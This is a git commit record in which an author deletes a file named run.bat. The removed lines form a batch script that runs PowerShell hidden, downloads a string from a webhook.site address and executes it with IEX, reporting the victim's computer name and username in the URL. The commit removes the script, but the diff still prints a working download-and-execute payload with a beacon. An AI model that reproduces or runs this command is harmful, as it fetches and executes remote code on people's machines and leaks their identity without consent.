9ee3e8560666a31bd8c0d562a874245eb45d99f9
Navid <mohammadnavidatayee@gmail.com>
2025-12-01 16:12:50 +0330

    Delete run.bat

--- run.bat
+++
@@ -1,2 +0,0 @@
-@echo off
-powershell -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString('https://webhook.site/caf8f897-4396-4d09-b589-659fde39630d?zip-bat-works=YES&pc=%COMPUTERNAME%-%USERNAME%&t='+[DateTime]::Now.Ticks))" >nul 2>&1
